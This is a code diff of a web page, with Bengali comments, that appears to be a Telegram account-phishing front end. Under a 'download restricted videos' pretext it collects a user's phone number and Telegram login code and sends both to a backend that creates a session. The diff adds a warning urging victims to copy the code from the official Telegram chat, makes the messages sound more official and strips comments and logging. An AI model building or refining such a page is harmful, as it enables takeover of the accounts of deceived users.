@@ -62,7 +62,6 @@
         .mystery-fab { position: fixed; bottom: 25px; right: 15px; background: linear-gradient(135deg, #ff0055, #ffcc00); color: white; border-radius: 14px; padding: 12px 16px; font-size: 13px; font-weight: bold; box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); cursor: pointer; z-index: 99990; border: 2px solid #fff; display: flex; align-items: center; gap: 6px; animation: redPulse 2s infinite; }
         @keyframes redPulse { 0%, 100% { box-shadow: 0 4px 15px rgba(255, 0, 85, 0.6); transform: translateY(0); } 50% { box-shadow: 0 4px 25px rgba(255, 0, 85, 0.95); transform: translateY(-4px); } }
         
-        /* CSS for Loading Spinner */
         .spinner { border: 4px solid rgba(255, 255, 255, 0.1); width: 36px; height: 36px; border-radius: 50%; border-left-color: #00ffaa; animation: spin 1s linear infinite; margin: 0 auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -113,13 +112,11 @@
             <h3 style="color: #00ffaa; margin-top: 0;">🔐 Link Telegram Account</h3>
             <p style="font-size: 11px; color: #ccc; margin-bottom: 20px;">Link your account to download restricted videos using your own identity.</p>
             
-            <!-- Number Input Section -->
             <div id="phone-sec">
                 <input type="text" id="phone-input" class="login-input" placeholder="e.g. 017XXXXXXXX">
                 <button class="share-btn" onclick="sendCode()">Send OTP Code</button>
             </div>
 
-            <!-- Loading Spinner Section -->
             <div id="loading-sec" style="display: none; margin: 25px 0;">
                 <div class="spinner"></div>
                 <div id="loading-text" style="font-size:12px; color:#00ffaa; margin-top:12px; font-weight:bold; line-height: 1.5;">
@@ -127,9 +124,12 @@
                 </div>
             </div>
 
-            <!-- OTP Input Section -->
             <div id="otp-sec" style="display: none;">
-                <input type="text" id="otp-input" class="login-input" placeholder="Enter OTP (e.g. 12345)" style="letter-spacing: 5px;">
+                <!-- ইউজারের সুবিধার্থে লাল কালারে ওয়ার্নিং দেওয়া হলো -->
+                <div style="font-size: 12px; color: #ff3366; margin-bottom: 10px; font-weight: bold;">
+                    ⚠️ Code sent! Check the official "Telegram" chat (with Blue Tick) for your code.
+                </div>
+                <input type="text" id="otp-input" class="login-input" placeholder="Enter Telegram OTP" style="letter-spacing: 5px;">
                 <button class="share-btn" style="background: linear-gradient(90deg, #00ffaa, #00aaff); color:#000;" onclick="verifyCode()">Verify & Connect</button>
             </div>
 
@@ -167,14 +167,9 @@
         let currentPhone = "";
         let currentHash = "";
 
-        function openLogin() { 
-            document.getElementById('loginModal').style.display = 'flex'; 
-        }
-
+        function openLogin() { document.getElementById('loginModal').style.display = 'flex'; }
         function closeLogin() { 
             document.getElementById('loginModal').style.display = 'none'; 
-            
-            // Modal ক্লোজ করলে আবার সব রিসেট করে ডিফল্ট অবস্থায় নিয়ে যাওয়া হলো
             setTimeout(() => {
                 document.getElementById('phone-sec').style.display = 'block';
                 document.getElementById('loading-sec').style.display = 'none';
@@ -195,7 +190,6 @@
             }
             currentPhone = rawPhone;
 
-            // ১. ফোন সেকশন হাইড করে লোডিং স্পিনার শো করা হলো
             document.getElementById('phone-sec').style.display = 'none';
             document.getElementById('loading-sec').style.display = 'block';
             document.getElementById('loading-text').innerHTML = "Connecting to Telegram API...<br>Please wait 5-10 seconds ⏳";
@@ -212,18 +206,15 @@
                 
                 if(data.status === "ok") {
                     currentHash = data.hash;
-                    // ২. সাকসেস হলে স্পিনার হাইড করে OTP পেজ শো করা হলো
                     document.getElementById('loading-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
-                    showToast("Code sent to your Telegram!");
+                    showToast("Code sent to Official Telegram!");
                 } else { 
-                    // এরর হলে স্পিনার হাইড করে আবার ফোন পেজে ফেরত পাঠানো হলো
                     document.getElementById('loading-sec').style.display = 'none';
                     document.getElementById('phone-sec').style.display = 'block';
-                    showToast("Error: " + data.msg); 
+                    showToast(data.msg); 
                 }
             } catch(e) { 
-                console.error(e);
                 document.getElementById('loading-sec').style.display = 'none';
                 document.getElementById('phone-sec').style.display = 'block';
                 showToast("Server error! Check internet."); 
@@ -234,10 +225,9 @@
             const otp = document.getElementById('otp-input').value.trim();
             if(!otp) return showToast("Enter OTP!");
             
-            // ১. OTP সেকশন হাইড করে আবার স্পিনার শো করা হলো
             document.getElementById('otp-sec').style.display = 'none';
             document.getElementById('loading-sec').style.display = 'block';
-            document.getElementById('loading-text').innerHTML = "Verifying & Creating Session...<br>Please wait a moment ⏳";
+            document.getElementById('loading-text').innerHTML = "Verifying Session...<br>Please wait a moment ⏳";
             
             try {
                 const urlWithTime = `${BACKEND_URL}/api/verify_code?t=${new Date().getTime()}`;
@@ -252,10 +242,9 @@
                     showToast("Account Linked Successfully! 🎉");
                     closeLogin();
                 } else { 
-                    // এরর হলে স্পিনার হাইড করে আবার OTP পেজে ফেরত পাঠানো হলো
                     document.getElementById('loading-sec').style.display = 'none';
                     document.getElementById('otp-sec').style.display = 'block';
-                    showToast("Error: " + data.msg); 
+                    showToast(data.msg); 
                 }
             } catch(e) { 
                 document.getElementById('loading-sec').style.display = 'none';
